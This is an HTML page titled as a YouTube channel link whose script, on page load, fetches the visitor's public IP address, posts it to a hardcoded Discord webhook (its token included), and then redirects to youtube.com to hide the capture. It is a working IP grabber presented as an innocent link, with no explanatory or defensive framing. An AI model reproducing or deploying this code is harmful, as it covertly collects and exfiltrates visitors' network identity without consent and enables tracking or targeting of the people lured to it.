<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>youtube.com/@axifn7</title>
</head>
<body>

<script>
  // ============ CONFIG ============
  const REDIRECT_LINK = "https://www.youtube.com";
  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466362286951104643/Jsm9HpSe-2vh2eDLjFcoQLdug_4Fe-iOd5rSCNWIZPVGdisDj_gZl9M9fH_yWErJVwph";
  const IP_API = "https://api.ipify.org?format=json";
  // ================================

  async function run() {
    try {
      // get public IP
      const res = await fetch(IP_API);
      const data = await res.json();
      const ip = data.ip;

      // send to discord webhook
      await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: "IP Test",
          content: `Public IP: \`${ip}\``
        })
      });

      console.log("Webhook sent");

    } catch (err) {
      console.error("Error:", err);
    }

    // redirect
    window.location.href = REDIRECT_LINK;
  }

  run();
</script>

</body>
</html>
